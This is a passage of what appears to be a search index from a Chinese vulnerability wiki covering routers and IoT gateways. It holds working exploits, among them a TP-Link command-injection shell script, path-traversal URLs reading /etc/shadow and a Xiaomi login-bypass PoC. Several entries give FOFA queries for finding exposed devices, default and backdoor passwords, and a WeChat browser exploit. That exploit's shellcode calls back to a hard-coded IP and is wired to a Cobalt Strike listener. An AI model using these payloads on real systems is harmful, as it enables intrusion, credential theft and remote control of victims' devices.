else alert(\"Invalid RSA public key\"); } // Perform raw public operation on \"x\": return x^e (mod n) function RSADoPublic(x) { return x.modPowInt(this.e, this.n); } // Return the PKCS#1 RSA encryption of \"text\" as an even-length hex string function RSAEncrypt(text) { var m = nopadding(text,(this.n.bitLength()+7)>>3); if(m == null) return null; var c = this.doPublic(m); if(c == null) return null; var h = c.toString(16); if((h.length & 1) == 0) return h; else return \"0\" + h; } function MainEncrypt(n,e,message) { RSAKey.prototype.doPublic = RSADoPublic; RSAKey.prototype.setPublic = RSASetPublic; RSAKey.prototype.encrypt = RSAEncrypt; var rsa = new RSAKey(); rsa.setPublic(n,e); var passwd = rsa.encrypt(message); return passwd; } 四、参考链接 https://www.03sec.com/3207.shtml Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:30 "},"IOT安全/TP-Link/（CVE-2020-9374）TP-Link TL-WR849N 远程命令执行漏洞/（CVE-2020-9374）TP-Link TL-WR849N 远程命令执行漏洞.html":{"url":"IOT安全/TP-Link/（CVE-2020-9374）TP-Link TL-WR849N 远程命令执行漏洞/（CVE-2020-9374）TP-Link TL-WR849N 远程命令执行漏洞.html","title":"（CVE-2020-9374）TP-Link TL-WR849N 远程命令执行漏洞","keywords":"","body":"（CVE-2020-9374）TP-Link TL-WR849N 远程命令执行漏洞 一、漏洞简介 在TP-Link TL-WR849N 0.9.1 4.16设备上，当攻击者将特定的外壳元字符发送到面板的traceroute功能时，可以利用诊断区域中的远程命令执行漏洞。 二、漏洞影响 TP-Link TL-WR849N 0.9.1 4.16 三、复现过程 # Exploit Title: TP LINK TL-WR849N - Remote Code Execution # Date: 2019-11-20 # Exploit Author: Elber Tavares # Vendor Homepage: https://www.tp-link.com/ # Software Link: https://www.tp-link.com/br/support/download/tl-wr849n/#Firmware # Version: TL-WR849N 0.9.1 4.16 # Tested on: linux, windows # CVE : CVE-2020-9374 import requests def output(headers,cookies): url = ‘http://192.168.0.1/cgi?1’ data = ‘’ data += ‘[TRACEROUTE_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,3\\x0d\\x0a’ data += ‘diagnosticsState\\x0d\\x0a’ data += ‘X_TP_HopSeq\\x0d\\x0a’ data += ‘X_TP_Result\\x0d\\x0a’ r = requests.post(url,data=data,headers=headers,cookies=cookies) saida = r.text filtro = saida.replace(’: Name or service not known’,’’) filtro = filtro.replace(’[0,0,0,0,0,0]0’,’’) filtro = filtro.replace(‘diagnosticsState=’,’’) filtro = filtro.replace(‘X_TP_HopSeq=0’,’’) filtro = filtro.replace(‘X_TP_Result=’,’’) print(filtro[:-8]) def aceppt(headers,cookies): url = ‘http://192.168.0.1/cgi?7’ data = ‘[ACT_OP_TRACERT#0,0,0,0,0,0#0,0,0,0,0,0]0,0\\x0d\\x0a’ r = requests.post(url,data=data,headers=headers,cookies=cookies) output(headers,cookies) def inject(command,headers,cookies): url = ‘http://192.168.0.1/cgi?2’ data = ‘’ data += ‘[TRACEROUTE_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,8\\x0d\\x0a’ data += ‘maxHopCount=20\\x0d\\x0a’ data += ‘timeout=5\\x0d\\x0a’ data += ‘numberOfTries=1\\x0d\\x0a’ data += ‘host=\"$(’+command+’)\"\\x0d\\x0a’ data += ‘dataBlockSize=64\\x0d\\x0a’ data += ‘X_TP_ConnName=ewan_pppoe\\x0d\\x0a’ data += ‘diagnosticsState=Requested\\x0d\\x0a’ data += ‘X_TP_HopSeq=0\\x0d\\x0a’ r = requests.post(url,data=data,headers=headers,cookies=cookies) aceppt(headers,cookies) def main(): cookies = {“Authorization”: “Basic REPLACEBASE64AUTH”} headers = {‘Content-Type’: ‘text/plain’, ‘Referer’: ‘http://192.168.0.1/mainFrame.htm’} while True: command = input(’$ ') inject(command,headers,cookies) main() Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:30 "},"IOT安全/WIFISKY-7层流控路由器/WIFISKY-7层流控路由器后台任意命令执行/WIFISKY-7层流控路由器后台任意命令执行.html":{"url":"IOT安全/WIFISKY-7层流控路由器/WIFISKY-7层流控路由器后台任意命令执行/WIFISKY-7层流控路由器后台任意命令执行.html","title":"WIFISKY-7层流控路由器后台任意命令执行","keywords":"","body":"WIFISKY-7层流控路由器后台任意命令执行 漏洞描述 深圳市领空技术有限公司WIFISKY-7层流控路由器后台任意命令执行，攻击者可以通过登录弱口令进入后台执行任意命令。 漏洞影响 WIFISKY-7层流控路由器 FOFA app=\"WIFISKY-7层流控路由器\" 漏洞复现 1）登录界面如下 2）默认密码登录 admin/admin，登录界面如下 3）点击系统维护 执行支持的命令后面加入&跟系统命令如ifconfig & cat /etc/passwd Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:31 "},"IOT安全/ZeroShell/ZeroShell 3.9.0 远程命令执行漏洞 CVE-2019-12725/ZeroShell 3.9.0 远程命令执行漏洞 CVE-2019-12725.html":{"url":"IOT安全/ZeroShell/ZeroShell 3.9.0 远程命令执行漏洞 CVE-2019-12725/ZeroShell 3.9.0 远程命令执行漏洞 CVE-2019-12725.html","title":"ZeroShell 3.9.0 远程命令执行漏洞 CVE-2019-12725","keywords":"","body":"ZeroShell 3.9.0 远程命令执行漏洞 CVE-2019-12725 漏洞描述 ZeroShell 3.9.0 存在命令执行漏洞，/cgi-bin/kerbynet 页面，x509type 参数过滤不严格，导致攻击者可执行任意命令 漏洞影响 ZeroShell FOFA app=\"Zeroshell-防火墙\" 漏洞复现 登录页面如下 [ 验证的POC为 /cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%0Aid%0A%27 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:35 "},"IOT安全/Zyxel/Zyxel NBG2105 身份验证绕过 CVE-2021-3297/Zyxel NBG2105 身份验证绕过 CVE-2021-3297.html":{"url":"IOT安全/Zyxel/Zyxel NBG2105 身份验证绕过 CVE-2021-3297/Zyxel NBG2105 身份验证绕过 CVE-2021-3297.html","title":"Zyxel NBG2105 身份验证绕过 CVE-2021-3297","keywords":"","body":"Zyxel NBG2105 身份验证绕过 CVE-2021-3297 漏洞描述 Zyxel NBG2105 存在身份验证绕过，攻击者通过更改 login参数可用实现后台登陆 漏洞影响 [!NOTE] Zyxel NBG2105 FOFA [!NOTE] app=\"ZyXEL-NBG2105\" 漏洞复现 登录页面如下 其中前端文件 /js/util_gw.js 存在前端对 Cookie login参数的校验 可以看到检测到 Cookie中的 login=1 则跳转 home.html function setCookie() //login_ok.htm use { document.cookie=\"login=1\"; MM_goToURL('parent', 'home.htm'); } 请求如下则会以管理员身份跳转到 home.htm页面 http://xxx.xxx.xxx.xxx/login_ok.htm Cookie: login=1; 参考文章 https://github.com/nieldk/vulnerabilities/blob/main/zyxel%20nbg2105/Admin%20bypass Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:36 "},"IOT安全/中国移动禹路由/中国移动 禹路由 ExportSettings.sh 敏感信息泄露漏洞/中国移动 禹路由 ExportSettings.sh 敏感信息泄露漏洞.html":{"url":"IOT安全/中国移动禹路由/中国移动 禹路由 ExportSettings.sh 敏感信息泄露漏洞/中国移动 禹路由 ExportSettings.sh 敏感信息泄露漏洞.html","title":"中国移动 禹路由 ExportSettings.sh 敏感信息泄露漏洞","keywords":"","body":"中国移动 禹路由 ExportSettings.sh 敏感信息泄露漏洞 漏洞描述 中国移动 禹路由 ExportSettings.sh 存在敏感信息泄露漏洞，攻击者通过漏洞获取配置文件，其中包含账号密码等敏感信息 漏洞影响 中国移动 禹路由 FOFA title=\"互联世界 物联未来-登录\" 漏洞复现 登录页面如下 访问Url /cgi-bin/ExportSettings.sh 其中password为登录后台密码 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:37 "},"IOT安全/中国移动禹路由/中国移动 禹路由 simple-index.asp 登录绕过漏洞/中国移动 禹路由 simple-index.asp 登录绕过漏洞.html":{"url":"IOT安全/中国移动禹路由/中国移动 禹路由 simple-index.asp 登录绕过漏洞/中国移动 禹路由 simple-index.asp 登录绕过漏洞.html","title":"中国移动 禹路由 simple-index.asp 登录绕过漏洞","keywords":"","body":"中国移动 禹路由 simple-index.asp 登录绕过漏洞 漏洞描述 中国移动 禹路由 simple-index.asp 存在登录绕过，可以查看wifi信息。 漏洞影响 中国移动 禹路由 FOFA title=\"互联世界 物联未来-登录\" 漏洞复现 登录页面如下 访问Url /simple-index.asp ​ 可以通过元素审计获取Wifl账号密码等信息 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:38 "},"IOT安全/华为HG659/华为HG659 任意文件  读取漏洞/华为HG659 任意文件  读取漏洞.html":{"url":"IOT安全/华为HG659/华为HG659 任意文件  读取漏洞/华为HG659 任意文件  读取漏洞.html","title":"华为HG659 任意文件  读取漏洞","keywords":"","body":"华为 HG659任意文件读取漏洞 漏洞描述 华为 HG659 lib 存在任意文件读取漏洞，攻击者通过漏洞可以读取任意文件 漏洞影响 华为HG659 FOFA app=\"HUAWEI-Home-Gateway-HG659\" 漏洞复现 登录页面如下： POC /lib///....//....//....//....//....//....//....//....//etc//passwd Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:39 "},"IOT安全/安网科技智能路由/安网科技-智能路由系统后台任意文件上传/安网科技-智能路由系统后台任意文件上传.html":{"url":"IOT安全/安网科技智能路由/安网科技-智能路由系统后台任意文件上传/安网科技-智能路由系统后台任意文件上传.html","title":"安网科技-智能路由系统后台任意文件上传","keywords":"","body":"安网科技-智能路由系统后台任意文件上传 漏洞描述 广州安网贝腾信息科技有限公司智能路由系统AC集中管理平台存在任意文件上传，攻击者可以通过此漏洞上传webshell。 漏洞影响 智能AC管理系统 FOFA title=\"安网科技-智能路由系统\" 漏洞复现 1）登录界面如下 默认弱口令admin/admin，登录成功界面如下(几乎都存在默认口令) 在后台系统配置->AP系统管理->AP固件升级处可以上传文件，并且为前端验证，可以修改后缀绕过前端验证。 想GETSHELL？ 请自己动脑筋，我太菜我不会。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:40 "},"IOT安全/安网科技智能路由/安网科技-智能路由系统默认弱口令/安网科技-智能路由系统默认弱口令.html":{"url":"IOT安全/安网科技智能路由/安网科技-智能路由系统默认弱口令/安网科技-智能路由系统默认弱口令.html","title":"安网科技-智能路由系统默认弱口令","keywords":"","body":"安网科技-智能路由系统默认弱口令 漏洞描述 广州安网贝腾信息科技有限公司智能路由系统AC集中管理平台存在默认弱口令，攻击者可以通过此默认口令登录平台。 漏洞影响 智能AC管理系统 FOFA title=\"安网科技-智能路由系统\" 漏洞复现 登录页面如下 1）登录界面如下 默认弱口令admin/admin，登录成功界面如下(几乎都存在默认口令) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:44 "},"IOT安全/宏电H8922/宏电H8922路由器多个漏洞/宏电H8922路由器多个漏洞.html":{"url":"IOT安全/宏电H8922/宏电H8922路由器多个漏洞/宏电H8922路由器多个漏洞.html","title":"宏电H8922路由器多个漏洞","keywords":"","body":"(1)、后门: 通过telnet服务在端口5188上使用默认账号密码：root ：superzxmn即可无限制登录，并且不会有记录。 (2)、命令执行 在后台网络诊断处的/tools.cgi没有对用户输入的参数进行过滤，导致了具有最小权限的攻击者可以通过命令拼接来执行操作系统的任意命令。 (3)、任意文件读取 /log_download.cgi日志导出处理程序不验证用户输入，可以进行任意文件下载和读取，例如“/../etc/passwd” (4)、敏感信息泄露 通过http://[ip]/backup2.cgi访问设备系统配置（cli.conf）的文件可获取管理员账号密码 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:46 "},"IOT安全/小米/（CVE-2019-18371） Xiaomi Mi WiFi R3G 任意文件读取漏洞/（CVE-2019-18371） Xiaomi Mi WiFi R3G 任意文件读取漏洞.html":{"url":"IOT安全/小米/（CVE-2019-18371） Xiaomi Mi WiFi R3G 任意文件读取漏洞/（CVE-2019-18371） Xiaomi Mi WiFi R3G 任意文件读取漏洞.html","title":"（CVE-2019-18371） Xiaomi Mi WiFi R3G 任意文件读取漏洞","keywords":"","body":"(CVE-2019-18371)Xiaomi Mi WiFi R3G 任意文件读取漏洞 一、漏洞简介 Xiaomi Mi WiFi R3G是中国小米科技（Xiaomi）公司的一款3G路由器。 Xiaomi Mi WiFi R3G 2.28.23-stable之前版本中存在输入验证错误漏洞。该漏洞源于网络系统或产品未对输入的数据进行正确的验证。 二、漏洞影响 Xiaomi Mi WiFi R3G 2.28.23-stable之前版本 三、复现过程 小米路由器的nginx配置文件错误，导致目录穿越漏洞，实现任意文件读取（无需登录） nginx配置不当可导致目录穿越漏洞， location /xxx { alias /abc/; } 可通过访问http://domain.cn/xxx../etc/passwd实现目录穿越访问上级目录及其子目录文件。 在小米路由器的文件/etc/sysapihttpd/sysapihttpd.conf中，存在 location /api-third-party/download/extdisks { alias /extdisks/; } 故可以任意文件读取根目录下的所有文件，而且是root权限，如访问http://192.168.31.1/api-third-party/download/extdisks../etc/shadow image-20200904224803971 类似的问题，存在多处如 location /backup/log { alias /tmp/syslogbackup/; } location /api-third-party/download/public { alias /userdisk/data/; } location /api-third-party/download/private { alias /userdisk/appdata/; } 通过任意文件读取，登录路由器后台 不是明文存储密码，进行一定分析。关注两个过程，一是登录时前端js生成http post请求参数过程，二是验证用户登陆的后端过程。 登录时前端js生成http post请求参数过程 var Encrypt = { key: 'a2ffa5c9be07488bbb04a3a47d3c5f6a', iv: '64175472480004614961023454661220', nonce: null, init: function(){ var nonce = this.nonceCreat(); this.nonce = nonce; return this.nonce; }, nonceCreat: function(){ var type = 0; // 自己的mac地址 var deviceId = ''; var time = Math.floor(new Date().getTime() / 1000); var random = Math.floor(Math.random() * 10000); return [type, deviceId, time, random].join('_'); }, oldPwd : function(pwd){ // oldPwd = sha1(nonce + sha1(pwd + 'a2ffa5c9be07488bbb04a3a47d3c5f6a')) return CryptoJS.SHA1(this.nonce + CryptoJS.SHA1(pwd + this.key).toString()).toString(); }, //... }; 可知oldPwd = sha1(nonce + sha1(pwd + 'a2ffa5c9be07488bbb04a3a47d3c5f6a'))，登陆请求包为 POST /cgi-bin/luci/api/xqsystem/login HTTP/1.1 Host: 192.168.31.1 username=admin&password=c9e62da7b8a0b7a4918c5a90912ba81a9717f9ab&logtype=2&nonce=0_mac地址_时间戳_5248 验证用户登陆的后端过程 调用XQSecureUtil.checkUser函数 function checkUser(user, nonce, encStr) -- 从xiaoqiang 配置文件中读取信息 local password = XQPreference.get(user, nil, \"account\") if password and not XQFunction.isStrNil(encStr) and not XQFunction.isStrNil(nonce) then if XQCryptoUtil.sha1(nonce..password) == encStr then return true end end XQLog.log(4, (luci.http.getenv(\"REMOTE_ADDR\") or \"\")..\" Authentication failed\", nonce, password, encStr) return false end 跟进XQPreference.get函数易知道是从/etc/config/account文件中读取某个字符串，这里称它为accountStr。 checkUser函数判断等式为(encStr为参数oldPwd) sha1(nonce + sha1(密码 + 'a2ffa5c9be07488bbb04a3a47d3c5f6a')) == sha1(nonce + accountStr) 则 accountStr == sha1(密码 + 'a2ffa5c9be07488bbb04a3a47d3c5f6a') 故，只需要读取/etc/config/account得到accountStr即可构造如下数据包登陆 POST /cgi-bin/luci/api/xqsystem/login HTTP/1.1 Host: 192.168.31.1 username=admin&password=sha1(nonce + account中保存的字符串)&logtype=2&nonce=0_mac地址_时间戳_5248 实现任意登陆poc arbitrary_file_read_vulnerability.py import os import re import time import base64 import random import hashlib import requests from Crypto.Cipher import AES # proxies = {\"http\":\"http://127.0.0.1:8080\"} proxies = {} def get_mac(): ## get mac r0 = requests.get(\"http://192.168.31.1/cgi-bin/luci/web\", proxies=proxies) mac = re.findall(r'deviceId = \\'(.*?)\\'', r0.text)[0] # print(mac) return mac def get_account_str(): ## read /etc/config/account r1 = requests.get(\"http://192.168.31.1/api-third-party/download/extdisks../etc/config/account\", proxies=proxies) print(r1.text) account_str = re.findall(r'admin\\'? \\'(.*)\\'', r1.text)[0] return account_str def create_nonce(mac): type_ = 0 deviceId = mac time_ = int(time.time()) rand = random.randint(0,10000) return \"%d_%s_%d_%d\"%(type_, deviceId, time_, rand) def calc_password(nonce, account_str): m = hashlib.sha1() m.update((nonce + account_str).encode('utf-8')) return m.hexdigest() mac = get_mac() account_str = get_account_str() ## login, get stok nonce = create_nonce(mac) password = calc_password(nonce, account_str) data = \"username=admin&password={password}&logtype=2&nonce={nonce}\".format(password=password,nonce=nonce) r2 = requests.post(\"http://192.168.31.1/cgi-bin/luci/api/xqsystem/login\", data = data, headers={\"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0\", \"Content-Type\": \"application/x-www-form-urlencoded; charset=UTF-8\"}, proxies=proxies) # print(r2.text) stok = re.findall(r'\"token\":\"(.*?)\"',r2.text)[0] print(\"stok=\"+stok) 可以获取到登录的stok image-20200904234409100 修复方案 任意文件读取 将/etc/sysapihttpd/sysapihttpd.conf中的形如以下形式修改为 location /xxx { alias /abc/; } 修改为 location /xxx/ { alias /abc/; } 参考链接 https://github.com/UltramanGaia/Xiaomi_Mi_WiFi_R3G_Vulnerability_POC/blob/master/report/report.md Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:48 "},"IOT安全/微信/微信利用exp/微信利用exp.html":{"url":"IOT安全/微信/微信利用exp/微信利用exp.html","title":"微信利用exp","keywords":"","body":"微信exp ENABLE_LOG = true; IN_WORKER = true; // run calc and hang in a loop var shellcode = [ 0xfc, 0xe8, 0x89, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xd2, 0x64, 0x8b, 0x52, 0x30, 0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf0, 0x52, 0x57, 0x8b, 0x52, 0x10, 0x8b, 0x42, 0x3c, 0x01, 0xd0, 0x8b, 0x40, 0x78, 0x85, 0xc0, 0x74, 0x4a, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x8b, 0x58, 0x20, 0x01, 0xd3, 0xe3, 0x3c, 0x49, 0x8b, 0x34, 0x8b, 0x01, 0xd6, 0x31, 0xff, 0x31, 0xc0, 0xac, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0x38, 0xe0, 0x75, 0xf4, 0x03, 0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75, 0xe2, 0x58, 0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b, 0x0c, 0x4b, 0x8b, 0x58, 0x1c, 0x01, 0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24, 0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a, 0x51, 0xff, 0xe0, 0x58, 0x5f, 0x5a, 0x8b, 0x12, 0xeb, 0x86, 0x5d, 0x68, 0x6e, 0x65, 0x74, 0x00, 0x68, 0x77, 0x69, 0x6e, 0x69, 0x54, 0x68, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0xe8, 0x00, 0x00, 0x00, 0x00, 0x31, 0xff, 0x57, 0x57, 0x57, 0x57, 0x57, 0x68, 0x3a, 0x56, 0x79, 0xa7, 0xff, 0xd5, 0xe9, 0xa4, 0x00, 0x00, 0x00, 0x5b, 0x31, 0xc9, 0x51, 0x51, 0x6a, 0x03, 0x51, 0x51, 0x68, 0xcb, 0x28, 0x00, 0x00, 0x53, 0x50, 0x68, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0x50, 0xe9, 0x8c, 0x00, 0x00, 0x00, 0x5b, 0x31, 0xd2, 0x52, 0x68, 0x00, 0x32, 0xc0, 0x84, 0x52, 0x52, 0x52, 0x53, 0x52, 0x50, 0x68, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x89, 0xc6, 0x83, 0xc3, 0x50, 0x68, 0x80, 0x33, 0x00, 0x00, 0x89, 0xe0, 0x6a, 0x04, 0x50, 0x6a, 0x1f, 0x56, 0x68, 0x75, 0x46, 0x9e, 0x86, 0xff, 0xd5, 0x5f, 0x31, 0xff, 0x57, 0x57, 0x6a, 0xff, 0x53, 0x56, 0x68, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x84, 0xca, 0x01, 0x00, 0x00, 0x31, 0xff, 0x85, 0xf6, 0x74, 0x04, 0x89, 0xf9, 0xeb, 0x09, 0x68, 0xaa, 0xc5, 0xe2, 0x5d, 0xff, 0xd5, 0x89, 0xc1, 0x68, 0x45, 0x21, 0x5e, 0x31, 0xff, 0xd5, 0x31, 0xff, 0x57, 0x6a, 0x07, 0x51, 0x56, 0x50, 0x68, 0xb7, 0x57, 0xe0, 0x0b, 0xff, 0xd5, 0xbf, 0x00, 0x2f, 0x00, 0x00, 0x39, 0xc7, 0x75, 0x07, 0x58, 0x50, 0xe9, 0x7b, 0xff, 0xff, 0xff, 0x31, 0xff, 0xe9, 0x91, 0x01, 0x00, 0x00, 0xe9, 0xc9, 0x01, 0x00, 0x00, 0xe8, 0x6f, 0xff, 0xff, 0xff, 0x2f, 0x72, 0x61, 0x31, 0x58, 0x00, 0xe2, 0x26, 0x9e, 0x3e, 0x30, 0xe8, 0xbe, 0xf9, 0x07, 0x26, 0x0c, 0xb7, 0x29, 0xcf, 0x9f, 0x0c, 0x71, 0x33, 0x42, 0x56, 0x55, 0x84, 0x12, 0x2d, 0x72, 0x24, 0x7d, 0x1c, 0xc6, 0xfe, 0x08, 0x22, 0xb5, 0x2b, 0x9a, 0xcb, 0x7b, 0x3e, 0x85, 0x07, 0xb8, 0xfc, 0xa4, 0x88, 0xe9, 0xe9, 0xae, 0x3f, 0x73, 0xaf, 0xe0, 0xca, 0x08, 0x0b, 0x12, 0x3a, 0xe9, 0x74, 0x31, 0x19, 0x8a, 0x58, 0xa4, 0xc5, 0xfb, 0x90, 0x80, 0xd5, 0xe8, 0x04, 0xbb, 0x71, 0x2b, 0x00, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x34, 0x2e, 0x30, 0x20, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, 0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x37, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x35, 0x2e, 0x31, 0x3b, 0x20, 0x2e, 0x4e, 0x45, 0x54, 0x20, 0x43, 0x4c, 0x52, 0x20, 0x32, 0x2e, 0x30, 0x2e, 0x35, 0x30, 0x37, 0x32, 0x37, 0x29, 0x0d, 0x0a, 0x00, 0x5c, 0x06, 0x71, 0x87, 0x72, 0x72, 0xb2, 0x05, 0x6b, 0x32, 0x1e, 0xcf, 0x09, 0x1a, 0x41, 0x36, 0xba, 0x6d, 0xe1, 0x1e, 0xe2, 0x4f, 0x33, 0xc8, 0x96, 0xc0, 0x8a, 0x6e, 0x3f, 0x34, 0x89, 0xbc, 0x44, 0x4c, 0x53, 0xf8, 0xb4, 0x8b, 0xe5, 0x88, 0x1b, 0x84, 0x78, 0x30, 0xe7, 0x1e, 0x1b, 0xde, 0xb8, 0x2b, 0x50, 0x77, 0x17, 0x3e, 0x15, 0xb4, 0x7a, 0x61, 0x1c, 0xde, 0xb9, 0x78, 0x67, 0x81, 0x91, 0x5f, 0x2a, 0x9b, 0x7a, 0x7a, 0xc4, 0xd4, 0x6d, 0xb4, 0x69, 0xdf, 0xa3, 0xb8, 0xf4, 0x18, 0x26, 0x50, 0x66, 0x88, 0xbd, 0xf7, 0x5c, 0xfc, 0xb6, 0xfd, 0xd2, 0x63, 0xe5, 0x16, 0x79, 0x1a, 0x10, 0x13, 0xfa, 0x15, 0xb8, 0x96, 0x58, 0x5b, 0x7e, 0x1e, 0xd2, 0xd9, 0x4b, 0xe9, 0xb6, 0x4a, 0x58, 0xa6, 0x93, 0x7f, 0xb6, 0x41, 0xc8, 0xd6, 0x2a, 0xb4, 0x0b, 0x15, 0xb9, 0xb7, 0xe6, 0xef, 0xd6, 0xca, 0xc7, 0xf0, 0x30, 0xbd, 0xef, 0xcf, 0x2d, 0x63, 0x61, 0x03, 0xf3, 0x49, 0x3b, 0x88, 0x72, 0x66, 0x23, 0x22, 0xb8, 0x91, 0x8d, 0xb8, 0xb2, 0x4f, 0x21, 0xaf, 0x93, 0x5c, 0x5a, 0x67, 0x12, 0xb5, 0xa7, 0x06, 0xa8, 0xde, 0xf7, 0xe5, 0x41, 0xca, 0x50, 0x47, 0xcc, 0x84, 0xb9, 0x6b, 0x05, 0x09, 0x83, 0x1a, 0xa7, 0xa1, 0x3a, 0x03, 0x75, 0x60, 0xf5, 0xf4, 0xba, 0x08, 0x02, 0x99, 0x8e, 0xfa, 0xc8, 0x72, 0xf5, 0xdc, 0x9b, 0x46, 0xda, 0x5a, 0xbf, 0x1e, 0x13, 0x11, 0xf8, 0xfa, 0x92, 0x28, 0x23, 0x70, 0xd0, 0x79, 0x96, 0x19, 0x8c, 0x38, 0x00, 0x68, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x6a, 0x40, 0x68, 0x00, 0x10, 0x00, 0x00, 0x68, 0x00, 0x00, 0x40, 0x00, 0x57, 0x68, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x93, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x01, 0xd9, 0x51, 0x53, 0x89, 0xe7, 0x57, 0x68, 0x00, 0x20, 0x00, 0x00, 0x53, 0x56, 0x68, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x85, 0xc0, 0x74, 0xc6, 0x8b, 0x07, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xe5, 0x58, 0xc3, 0xe8, 0x89, 0xfd, 0xff, 0xff, 0x34, 0x35, 0x2e, 0x31, 0x39, 0x35, 0x2e, 0x31, 0x35, 0x33, 0x2e, 0x31, 0x39, 0x39, 0x00, 0x6f, 0xaa, 0x51, 0xc3 ]; function print(data) { } var not_optimised_out = 0; var target_function = (function (value) { if (value == 0xdecaf0) { not_optimised_out += 1; } not_optimised_out += 1; not_optimised_out |= 0xff; not_optimised_out *= 12; }); for (var i = 0; i 0x01漏洞介绍 攻击者可以通过在网页js插入攻击代码，用户一旦点击链接，Windows版微信便会加载执行攻击者构造恶意代码，最终使攻击者控制用户PC。 攻击者可以利用此漏洞执行任意代码，控制用户PC，存在极大的危害。 0x02影响版本 Windows版微信: 小于等于3.2.1.141版本 0x03漏洞复现 1、搭建cs，设置一个http或https的监听器 2、生成payload，选择上一步的监听器，输出选择C#，我这里就不勾选x64了，点击生成，将生成的文件保存到桌面。 3、使用两个脚本，修改color.js中的shellcode为cs生成的shellcode 4、然后搭建一个http服务器可以使用python开启也可以直接使用apache，然后发送到微信上点击，cs上线成功 5、查看复现wx版本（最新版微信使用默认浏览器打开，无法利用） 6、修复建议： ①、将Windows版本微信更新到3.2.1.141以上的最新版本。 ②、建议不要乱点别人发送的链接。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:48 "},"IOT安全/朗视/朗视 TG400 GSM 网关目录遍历 CVE-2021-27328/朗视 TG400 GSM 网关目录遍历 CVE-2021-27328.html":{"url":"IOT安全/朗视/朗视 TG400 GSM 网关目录遍历 CVE-2021-27328/朗视 TG400 GSM 网关目录遍历 CVE-2021-27328.html","title":"朗视 TG400 GSM 网关目录遍历 CVE-2021-27328","keywords":"","body":"朗视 TG400 GSM 网关目录遍历 CVE-2021-27328 漏洞描述 朗视 TG400 GSM 网关存在目录遍历 ，攻击者可以通过漏洞获取敏感信息 漏洞影响 朗视 TG400 GSM 网关 漏洞复现 暂无FOFA语句及固件设备复现 获取固件解密密码 http://192.168.43.246/cgi/WebCGI?1404=../../../../../../../../../../bin/firmware_detect /etc/passwd： http://192.168.43.246/cgi/WebCGI?1404=../../../../../../../../../../etc/passwd 参考文章 https://github.com/SQSamir/CVE-2021-27328 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:49 "},"IOT安全/爱快路由器/爱快路由器后台任意文件读取/爱快路由器后台任意文件读取.html":{"url":"IOT安全/爱快路由器/爱快路由器后台任意文件读取/爱快路由器后台任意文件读取.html","title":"爱快路由器后台任意文件读取","keywords":"","body":"爱快路由器后台任意文件读取 漏洞描述 爱块路由器后台存在任意文件读取漏洞，攻击者可通过漏洞读取敏感信息 漏洞影响 3.3.0 x64 Build201912171705 以下版本 FOFA app=\"iKuai-产品\" 漏洞复现 该漏洞需要先通过某种手段进入到后台，如弱口令、撞库等。 进入到后台之后可通过以下url进行任意文件读取 http://x.x.x.x/Action/download?filename=../../../../../../etc/shadow HTTP/1.1 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:49 "},"IOT安全/电信/电信网关配置管理系统/电信网关配置管理系统.html":{"url":"IOT安全/电信/电信网关配置管理系统/电信网关配置管理系统.html","title":"电信网关配置管理系统","keywords":"","body":"漏洞描述 电信网关配置管理系统 前台登陆页面用户名参数存在SQL注入漏洞 漏洞影响 电信网关配置管理系统 FOFA body=\"src=\\\"img/dl.gif\\\"\" && title=\"系统登录\" 漏洞复现 登录页面如下 设备存在默认弱口令 admin/admin 